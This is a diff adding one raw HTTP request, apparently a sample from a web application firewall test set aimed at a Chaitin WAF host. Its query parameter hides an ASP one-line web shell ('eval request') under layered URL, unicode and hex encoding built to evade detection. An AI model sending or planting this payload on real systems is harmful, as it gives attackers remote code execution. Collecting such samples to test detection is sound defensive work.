@@ -1,0 +1,13 @@
+POST /symmetric/incident/comma?load=%0D%5B%20%5B%20%22%5Cu0033%5Cu0063%5Cu0032%5Cu0035%5Cu0036%5Cu0035%5Cu0037%5Cu0036%5Cu0036%5Cu0031%5Cu0036%5Cu0063%5Cu0032%5Cu0030%5Cu0037%5Cu0032%5Cu0036%5Cu0035%5Cu0037%5Cu0031%5Cu0037%5Cu0035%5Cu0036%5Cu0035%5Cu0037%5Cu0033%5Cu0037%5Cu0034%5Cu0032%5Cu0038%5Cu0032%5Cu0032%5Cu0037%5Cu0033%5Cu0036%5Cu0032%5Cu0032%5Cu0032%5Cu0032%5Cu0039%5Cu0032%5Cu0035%5Cu0033%5Cu0065%22%09%5D%0D%2C24%0D%2Cfalse%5D HTTP/1.1
+Host: waf-ce.chaitin.cn
+Cache-Control: no-cache
+Pragma: no-cache
+Accept: */*
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: keep-alive
+Content-Length: 0
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36 LBBROWSER
+Cookie: tentative=intervention; SESSIONID=767d3f9c425eabc38a3d227580109f161435b60761dbc02f1c70cefc592f092927e95183e56893494aeadcf6c69a349e
+
